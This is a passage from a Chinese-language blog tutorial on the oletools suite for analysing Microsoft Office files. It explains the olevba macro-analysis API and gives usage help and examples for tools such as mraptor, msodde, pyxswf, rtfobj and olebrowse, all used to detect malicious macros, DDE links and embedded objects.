class="string">&#x27;my_file_with_macros.doc&#x27;</span></span><br><span class="line">filedata = <span class="built_in">open</span>(myfile, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">vbaparser = VBA_Parser(myfile, data=filedata)</span><br></pre></td></tr></table></figure><p>如果文件不是受支持的格式，例如 OLE (MS Office 97-2003)，OpenXML (MS Office 2007+)，MHTML 或 Word 2003 XML，则 VBA_Parser 将引发异常。解析文件后，VBA_Parser.type 属性是表明文件类型的字符串。它可以是 TYPE_OLE，TYPE_OpenXML，TYPE_Word2003_XML 或 TYPE_MHTML (在 olevba 模块中定义的常量)。</p><span class='p blue'>检测 VBA 宏</span><p>VBA_Parser 对象中的 detect_vba_macros 方法可检测 VBA 宏是否存在，若存在，则返回 True，否则返回 False，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> vbaparser.detect_vba_macros():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;VBA Macros found&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;No VBA Macros found&#x27;</span></span><br></pre></td></tr></table></figure><p>检测算法会在 OLE 结构中查找具有特定名称的流和存储结构，这对于上面列出的所有受支持的格式都适用。但是，对于某些格式 (例如 PowerPoint 97-2003)，此方法将始终返回 False，因为 VBA 宏是以 olevba 尚不支持的另一种方式存储的。此外，如果文件包含嵌入式文档 (例如，插入到 Word 文档中的 Excel 工作簿)，即使嵌入的文档包含 VBA 宏，此方法可能返回 True，即使没有了主文档。</p><div class="tip warning faa-horizontal animated"><p>原文作者是用了 may return True，具体可自行去验证</p></div><span class='p blue'>提取 VBA 宏代码</span><p>extract_macros 方法可在文件 (可能包括嵌入式文件) 中找到每个 VBA 宏，并把它们提取和解压缩，会为找到的每个 VBA 宏生成一个 tuple (filename，stream_path，vba_filename，vba_code)。</p><ul><li>filename：如果文件是 OLE (MS Office 97-2003) 类型，则 filename 是文件的路径。如果文件是 OpenXML (MS Office 2007+) 类型，则 filename 是压缩包中包含 VBA 宏的 OLE 子文件的路径，例如 word/vbaProject.bin</li><li>stream_path：包含 VBA 宏代码的 OLE 流路径</li><li>vba_filename：对应的 VBA 文件名</li><li>vba_code：以明文形式包含的 VBA 代码字符串</li></ul><p>举个粟子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (filename, stream_path, vba_filename, vba_code) <span class="keyword">in</span> vbaparser.extract_macros():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;-&#x27;</span>*<span class="number">79</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Filename    :&#x27;</span>, filename</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;OLE stream  :&#x27;</span>, stream_path</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;VBA filename:&#x27;</span>, vba_filename</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;- &#x27;</span>*<span class="number">39</span></span><br><span class="line">    <span class="built_in">print</span> vba_code</span><br></pre></td></tr></table></figure><span class='p blue'>分析 VBA 宏代码</span><p>从 v0.40 版本开始，已经用 VBA_Parser 类来替代 VBA_Scanner 类，VBA_Scanner 类已被废弃，类中提供的方法都用来分析宏。</p><p>VBA_Parser 类中的 analyze_macros 方法能够从所有的 VBA 模块中找到混淆的字符串、可疑的关键字、IOCs、自动执行宏等等。</p><p>VBA_Parser.analyze_macros() 方法返回一个包含 tuple(type, keyword, description) 的列表，以下为其中之一的所有项</p><ul><li>type 的值为 AutoExec、Suspicious、IOC、Hex String、Base64 String、Dridex String、VBA obfuscated Strings 中之一</li><li>keyword 的值为自动执行宏、可疑关键字或 IOCs。对于混淆的字符串来说，这是解码后的字符串</li><li>description 的值提供 keyword 的描述，对于混淆的字符串来说，这是解码后的字符串</li></ul><p>举个粟子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">results = vbaparser.analyze_macros()</span><br><span class="line"><span class="keyword">for</span> kw_type, keyword, description <span class="keyword">in</span> results:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;type=%s - keyword=%s - description=%s&#x27;</span> % (kw_type, keyword, description)</span><br></pre></td></tr></table></figure><p>在调用 analyze_macros 方法后，下列 VBA_Parser 这些属性在每一个分类中都能显示相关条目的数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;AutoExec keywords: %d&#x27;</span> % vbaparser.nb_autoexec</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Suspicious keywords: %d&#x27;</span> % vbaparser.nb_suspicious</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;IOCs: %d&#x27;</span> % vbaparser.nb_iocs</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Hex obfuscated strings: %d&#x27;</span> % vbaparser.nb_hexstrings</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Base64 obfuscated strings: %d&#x27;</span> % vbaparser.nb_base64strings</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Dridex obfuscated strings: %d&#x27;</span> % vbaparser.nb_dridexstrings</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;VBA obfuscated strings: %d&#x27;</span> % vbaparser.nb_vbastrings</span><br></pre></td></tr></table></figure><span class='p blue'>对 VBA 宏代码去混淆</span><p>reveal 方法可去混淆，去混淆原理为将解码后的内容替换原来混淆的字符串，并返回一个字符串。</p><p>举个粟子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> vbaparser.reveal()</span><br></pre></td></tr></table></figure><span class='p blue'>关闭 VBA_Parser</span><p>在使用过后，最好是调用 VBA_Parser 对象中的关闭方法，以确保文件被关闭，特别是当你解析很多文件时更应该这样做</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vbaparser.close()</span><br></pre></td></tr></table></figure><h3 id="废弃的-API"><a href="#废弃的-API" class="headerlink" title="废弃的 API"></a>废弃的 API</h3><div class="tip error"><p>关于废弃的 API，这里就没必要讲了</p></div><h2 id="mraptor-MacroRaptor"><a href="#mraptor-MacroRaptor" class="headerlink" title="mraptor (MacroRaptor)"></a>mraptor (MacroRaptor)</h2><p>mraptor 使用一般启发式技术来检测大多数恶意 VBA 宏，与反病毒引擎不同，它不依赖于特征。简而言之，mraptor 可以检测以下三种行为类型所对应的关键字 (明文)</p><ul><li>A：触发自动执行行为</li><li>W：对文件系统和内存有写行为</li><li>X：在 VBA 内容外执行文件或 payload</li></ul><p>当以上三个标记其中有一个为 True 时，mraptor 就会认为此宏为恶意的。如果你想要了解关于 mraptor 检测算法，可参看 <a href="http://www.decalage.info/mraptor">这篇文章</a>。mraptor 不仅可以作为一个命令行工具，也可以在你的 Python 应用程序中当作模块导入。</p><h3 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Usage: mraptor [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open all files from it,</span><br><span class="line">                        using the provided password (requires Python 2.6+)</span><br><span class="line">  -f ZIP_FNAME, --zipfname=ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br><span class="line">  -l LOGLEVEL, --loglevel=LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  -m, --matches         Show matched strings.</span><br><span class="line">An exit code is returned based on the analysis result:</span><br><span class="line"> - 0: No Macro</span><br><span class="line"> - 1: Not MS Office</span><br><span class="line"> - 2: Macro OK</span><br><span class="line"> - 10: ERROR</span><br><span class="line"> - 20: SUSPICIOUS</span><br></pre></td></tr></table></figure><h3 id="一些粟子-1"><a href="#一些粟子-1" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mraptor file.doc</span><br></pre></td></tr></table></figure><p>扫描一个加了密的的 zip 压缩文件，密码为 <code>infected</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mraptor malicious_file.xls.zip -z infected</span><br></pre></td></tr></table></figure><p>扫描一个文件夹下的所有文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mraptor &quot;MalwareZoo/VBA/*&quot;</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：在 Linux/MacOSX 上，使用 * 和 ？等通配符时，请始终在文件名前后加上双引号， 否则，shell 可以在启动脚本之前用与通配符匹配的文件的实际列表替换参数。</p></div><p><img src="https://image.zeronohacker.com/article/2020/09/08/117e17608d934428abb8af185cdf9b6d.png" alt=""></p><h3 id="Python3-支持-——-mraptor3"><a href="#Python3-支持-——-mraptor3" class="headerlink" title="Python3 支持 —— mraptor3"></a>Python3 支持 —— mraptor3</h3><p>自从 v0.54 版本以来，mraptor 完全兼容 Python2 和 Python3，因此 mraptor3 就没必要再去使用了，但是为了向下兼容，还是将它保留了。</p><h3 id="在-Python-应用程序中如何使用-mraptor"><a href="#在-Python-应用程序中如何使用-mraptor" class="headerlink" title="在 Python 应用程序中如何使用 mraptor"></a>在 Python 应用程序中如何使用 mraptor</h3><p>TODO</p><h2 id="msodde"><a href="#msodde" class="headerlink" title="msodde"></a>msodde</h2><p>msodde 可在 MS Office 中检测和提取 DDE 链接 (例如 DDEAUTO)，被用来运行恶意命令传递恶意软件。它还支持 CSV 文件，CSV 文件可能包含 Excel 公式，目的是为了方便使用 DDE (称为 CSV 注入) 运行可执行文件。对于 Word 文档，它可以提取所有字段，并识别其中的可疑字段。</p><p>支持的格式</p><ul><li>Word 97-2003 (.doc, .dot), Word 2007+ (.docx, .dotx, .docm, .dotm)</li><li>Excel 97-2003 (.xls), Excel 2007+ (.xlsx, .xlsm, .xlsb)</li><li>RTF</li><li>CSV (exported from/imported into Excel)</li><li>XML (exported from Word 2003, Word 2007+, Excel 2003, Excel 2007+)</li></ul><p>对于 Word 文档，msodde 会检测使用 QUOTE 混淆的 DDE 命令，并自动对其进行去混淆。msodde 可以用作命令行工具，也可以在你的 Python 应用程序中当作模块导入。</p><h3 id="关于-DDE-的漏洞利用分析文章"><a href="#关于-DDE-的漏洞利用分析文章" class="headerlink" title="关于 DDE 的漏洞利用分析文章"></a>关于 DDE 的漏洞利用分析文章</h3><p>个人还是比较推荐大家看一下 ^_^</p><ul><li><a href="https://www.contextis.com/blog/comma-separated-vulnerabilities">https://www.contextis.com/blog/comma-separated-vulnerabilities</a></li><li><a href="http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/">http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/</a></li><li><a href="https://pwndizzle.blogspot.nl/2017/03/office-document-macros-ole-actions-dde.html">https://pwndizzle.blogspot.nl/2017/03/office-document-macros-ole-actions-dde.html</a></li><li><a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/</a></li><li><a href="http://staaldraad.github.io/2017/10/23/msword-field-codes/">http://staaldraad.github.io/2017/10/23/msword-field-codes/</a></li><li><a href="https://xorl.wordpress.com/2017/12/11/microsoft-excel-csv-code-execution-injection-method/">https://xorl.wordpress.com/2017/12/11/microsoft-excel-csv-code-execution-injection-method/</a></li><li><a href="http://georgemauer.net/2017/10/07/csv-injection.html">http://georgemauer.net/2017/10/07/csv-injection.html</a></li><li><a href="http://blog.7elements.co.uk/2013/01/cell-injection.html">http://blog.7elements.co.uk/2013/01/cell-injection.html</a></li><li><a href="https://appsecconsulting.com/blog/csv-formula-injection">https://appsecconsulting.com/blog/csv-formula-injection</a></li><li><a href="https://www.owasp.org/index.php/CSV_Injection">https://www.owasp.org/index.php/CSV_Injection</a></li></ul><h3 id="使用方法-3"><a href="#使用方法-3" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">usage: msodde.py [-h] [-j] [--nounquote] [-l LOGLEVEL] [-p PASSWORD] [-d] [-f]</span><br><span class="line">                 [-a]</span><br><span class="line">                 FILE</span><br><span class="line">positional arguments:</span><br><span class="line">  FILE                  path of the file to be analyzed</span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -j, --json            Output in json format. Do not use with -ldebug</span><br><span class="line">  --nounquote           don&#x27;t unquote values</span><br><span class="line">  -l LOGLEVEL, --loglevel LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  -p PASSWORD, --password PASSWORD</span><br><span class="line">                        if encrypted office files are encountered, try</span><br><span class="line">                        decryption with this password. May be repeated.</span><br><span class="line">Filter which OpenXML field commands are returned:</span><br><span class="line">  Only applies to OpenXML (e.g. docx) and rtf, not to OLE (e.g. .doc). These</span><br><span class="line">  options are mutually exclusive, last option found on command line</span><br><span class="line">  overwrites earlier ones.</span><br><span class="line">  -d, --dde-only        Return only DDE and DDEAUTO fields</span><br><span class="line">  -f, --filter          Return all fields except harmless ones</span><br><span class="line">  -a, --all-fields      Return all fields, irrespective of their contents</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：在 v0.54 新版本中，-p 选项被用来解密那些加了密的文档</p></div><h3 id="一些粟子-2"><a href="#一些粟子-2" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msodde file.doc</span><br></pre></td></tr></table></figure><p>扫描一个 Word 文档，提取所有的域</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msodde -a file.doc</span><br></pre></td></tr></table></figure><h3 id="在-Python-应用程序中如何使用-msodde"><a href="#在-Python-应用程序中如何使用-msodde" class="headerlink" title="在 Python 应用程序中如何使用 msodde"></a>在 Python 应用程序中如何使用 msodde</h3><p>这项工作正在进行中，API 预计在将来的版本中更改。</p><h2 id="pyxswf"><a href="#pyxswf" class="headerlink" title="pyxswf"></a>pyxswf</h2><p>pyxswf 可用来在 MS Office 文件中检测、提取和分析嵌入的 Flash 对象 (SWF 文件)，这对于恶意软件分析特别有用。pyxswf 可看作是 xxxswf.py (由 Alexander Hanel 编写) 的一个扩展。与 xxxswf.py 相比，它可以在 MS Office 文档正确解析其 OLE 结构来提取流，这在分离的流中是必须的。分离的流是已知的一种混淆技术，可参看 <a href="http://web.archive.org/web/20121118021207/http://www.breakingpointsystems.com/resources/blog/evasion-with-ole2-fragmentation/">这篇文章</a> 来了解。</p><h3 id="使用方法-4"><a href="#使用方法-4" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Usage: pyxswf [options] &lt;file.bad&gt;</span><br><span class="line">Options:</span><br><span class="line">  -o, --ole             Parse an OLE file (e.g. Word, Excel) to look for SWF</span><br><span class="line">                        in each stream</span><br><span class="line">  -f, --rtf             Parse an RTF file to look for SWF in each embedded</span><br><span class="line">                        object</span><br><span class="line">  -x, --extract         Extracts the embedded SWF(s), names it MD5HASH.swf &amp;</span><br><span class="line">                        saves it in the working dir. No addition args needed</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -y, --yara            Scans the SWF(s) with yara. If the SWF(s) is</span><br><span class="line">                        compressed it will be deflated. No addition args</span><br><span class="line">                        needed</span><br><span class="line">  -s, --md5scan         Scans the SWF(s) for MD5 signatures. Please see func</span><br><span class="line">                        checkMD5 to define hashes. No addition args needed</span><br><span class="line">  -H, --header          Displays the SWFs file header. No addition args needed</span><br><span class="line">  -d, --decompress      Deflates compressed SWFS(s)</span><br><span class="line">  -r PATH, --recdir=PATH</span><br><span class="line">                        Will recursively scan a directory for files that</span><br><span class="line">                        contain SWFs. Must provide path in quotes</span><br><span class="line">  -c, --compress        Compresses the SWF using Zlib</span><br></pre></td></tr></table></figure><h3 id="一些粟子-3"><a href="#一些粟子-3" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>在 Word 文档中提取和检测 SWF 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\oletools&gt;pyxswf -o word_flash.doc</span><br><span class="line">OLE stream: &#x27;Contents&#x27;</span><br><span class="line">[SUMMARY] 1 SWF(s) in MD5:993664cc86f60d52d671b6610813cfd1:Contents</span><br><span class="line">        [ADDR] SWF 1 at 0x8  - FWS Header</span><br><span class="line">C:\oletools&gt;pyxswf -xo word_flash.doc</span><br><span class="line">OLE stream: &#x27;Contents&#x27;</span><br><span class="line">[SUMMARY] 1 SWF(s) in MD5:993664cc86f60d52d671b6610813cfd1:Contents</span><br><span class="line">        [ADDR] SWF 1 at 0x8  - FWS Header</span><br><span class="line">                [FILE] Carved SWF MD5: 2498e9c0701dc0e461ab4358f9102bc5.swf</span><br></pre></td></tr></table></figure><p>在 RTF 文档中提取和检测 SWF 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\oletools&gt;pyxswf -xf &quot;rtf_flash.rtf&quot;</span><br><span class="line">RTF embedded object size 1498557 at index 000036DD</span><br><span class="line">[SUMMARY] 1 SWF(s) in MD5:46a110548007e04f4043785ac4184558:RTF_embedded_object_0</span><br><span class="line">00036DD</span><br><span class="line">        [ADDR] SWF 1 at 0xc40  - FWS Header</span><br><span class="line">                [FILE] Carved SWF MD5: 2498e9c0701dc0e461ab4358f9102bc5.swf</span><br></pre></td></tr></table></figure><h3 id="在-Python-应用程序中如何使用-pyxswf"><a href="#在-Python-应用程序中如何使用-pyxswf" class="headerlink" title="在 Python 应用程序中如何使用 pyxswf"></a>在 Python 应用程序中如何使用 pyxswf</h3><p>TODO</p><h2 id="oleobj"><a href="#oleobj" class="headerlink" title="oleobj"></a>oleobj</h2><p>oleobj 可从 OLE 文件中提取嵌入的对象，oleobj 不仅可以作为一个命令行工具，也可以在你的 Python 应用程序中当作模块导入。此工具官方未作过多详细说明。</p><h3 id="使用方法-5"><a href="#使用方法-5" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">usage: usage: oleobj.py [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">positional arguments:</span><br><span class="line">  FILE                  Office files to parse (same as -i)</span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -d OUTPUT_DIR         use specified directory to output files.</span><br><span class="line">  -z ZIP_PASSWORD, --zip ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open first file from it,</span><br><span class="line">                        using the provided password (requires Python 2.6+)</span><br><span class="line">  -f ZIP_FNAME, --zipfname ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br><span class="line">  -l LOGLEVEL, --loglevel LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  -i FILE, --more-input FILE</span><br><span class="line">                        Additional file to parse (same as positional</span><br><span class="line">                        arguments)</span><br><span class="line">  -v, --verbose         verbose mode, set logging to DEBUG (overwrites -l)</span><br></pre></td></tr></table></figure><h3 id="在-Python-应用程序中如何使用-oleobj"><a href="#在-Python-应用程序中如何使用-oleobj" class="headerlink" title="在 Python 应用程序中如何使用 oleobj"></a>在 Python 应用程序中如何使用 oleobj</h3><p>查看 rtfobj.py 源代码</p><p>TODO</p><h2 id="rtfobj"><a href="#rtfobj" class="headerlink" title="rtfobj"></a>rtfobj</h2><p>rtfobj 可用于检测和提取存储在 RTF 文件中的嵌入式对象，例如 OLE 对象。它还可以检测 OLE 包对象，并提取嵌入式文件。从 v0.50 版本开始，rtfobj 包含一个自定义 RTF 解析器，该解析器旨在匹配 MS Word 的行为，以便处理混淆的 RTF 文件。有关一些具体示例，请查看 <a href="http://decalage.info/rtf_tricks">这篇文章</a>。rtfobj 可用作 Python 库或命令行工具。</p><h3 id="使用方法-6"><a href="#使用方法-6" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">rtfobj [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open first file from it,</span><br><span class="line">                        using the provided password (requires Python 2.6+)</span><br><span class="line">  -f ZIP_FNAME, --zipfname=ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br><span class="line">  -l LOGLEVEL, --loglevel=LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  -s SAVE_OBJECT, --save=SAVE_OBJECT</span><br><span class="line">                        Save the object corresponding to the provided number</span><br><span class="line">                        to a file, for example &quot;-s 2&quot;. Use &quot;-s all&quot; to save</span><br><span class="line">                        all objects at once.</span><br><span class="line">  -d OUTPUT_DIR         use specified directory to save output files.</span><br></pre></td></tr></table></figure><p>rtfobj 可显示已检测到的 OLE 和 Package 对象的列表及其属性，例如类和文件名。当 OLE Package 对象包含可执行文件或脚本时，会突出显示，例如：</p><p><img src="https://image.zeronohacker.com/article/2020/09/08/dfb8fa01393851d83f24eecbbeabfbd0.png" alt=""></p><p>要提取对象或文件，请使用 -s 选项，后跟表中所表示的对象编号，例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rtfobj -s 0</span><br></pre></td></tr></table></figure><p>它提取并解码相应的对象，并将其保存为名为 object_xxxx.bin 的文件，其中 xxxx 是对象在 RTF 文件中的位置。</p><h3 id="在-Python-应用程序中如何使用-rtfobj"><a href="#在-Python-应用程序中如何使用-rtfobj" class="headerlink" title="在 Python 应用程序中如何使用 rtfobj"></a>在 Python 应用程序中如何使用 rtfobj</h3><p>从 v0.50 版本开始，API 发生了重大变化，并且尚未最终确定。具体请参见 rtfobj 源码中的 RtfObjectParser 类。废弃的 API 在此不讲。</p><h2 id="olebrowse"><a href="#olebrowse" class="headerlink" title="olebrowse"></a>olebrowse</h2><p>olebrowse 是一个简单的 GUI 程序，可以浏览 OLE 文件 (例如 MS Word，Excel，Powerpoint 文档)，以查看和提取单个数据流。</p><h3 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h3><p>olebrowse 需要 Tkinter，在 Windows 和 MacOSX 上，可使用 Python 进行安装。但是，在 Linux 上，例如在 Ubuntu 上，可通过以下命令完成此操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-tk</span><br></pre></td></tr></table></figure><p>安装 Python3 版本的 Tkinter</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3-tk</span><br></pre></td></tr></table></figure><p>其实在安装 oletools 时会自动帮你处理好依赖关系。</p><h3 id="使用方法-7"><a href="#使用方法-7" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olebrowse [file]</span><br></pre></td></tr></table></figure><p>如果你提供一个文件，它将被打开，否则将出现一个对话框，让你浏览文件夹以打开文件。然后，如果它是有效的 OLE 文件，将显示数据流列表。你可以选择一个流，然后在内置的十六进制查看器中查看其内容，或将其保存到文件中以进行进一步分析。</p><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><p>主菜单上显示 OLE 文件中的所有流</p><p><img src="https://image.zeronohacker.com/article/2020/09/08/874e2f509f5186141efe8d3ca1daf61d.png" alt=""></p><p>流操作菜单</p><p><img src="https://image.zeronohacker.com/article/2020/09/08/d1ebbe94ddb6c64b413d1e3139903d66.png" alt=""></p><p>流的十六进制视图</p><p><img src="https://image.zeronohacker.com/article/2020/09/08/8d3ee6a1c01caa7a2aebbeddd5d2c7f1.png" alt=""></p><h2 id="olemeta"><a href="#olemeta" class="headerlink" title="olemeta"></a>olemeta</h2><p>olemeta 可用于解析 OLE 文件 (例如 MS Office 文档中的 Word，Excel)，以提取 OLE 文件中存在的所有标准属性。</p><h3 id="使用方法-8"><a href="#使用方法-8" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olemeta &lt;file&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/09/08/f19082ebe38d0de8203b0c9890b6d440.png" alt=""></p><h3 id="在-Python-应用程序中如何使用-olemeta"><a href="#在-Python-应用程序中如何使用-olemeta" class="headerlink" title="在 Python 应用程序中如何使用 olemeta"></a>在 Python 应用程序中如何使用 olemeta</h3><p>TODO</p><h2 id="oletimes"><a href="#oletimes" class="headerlink" title="oletimes"></a>oletimes</h2><p>oletimes 可用于解析 OLE 文件 (例如 MS Office 文档中的 Word，Excel)，以提取 OLE 文件中所有流和存储的创建和修改时间。</p><h3 id="使用方法-9"><a href="#使用方法-9" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oletimes &lt;file&gt;</span><br></pre></td></tr></table></figure><p>对 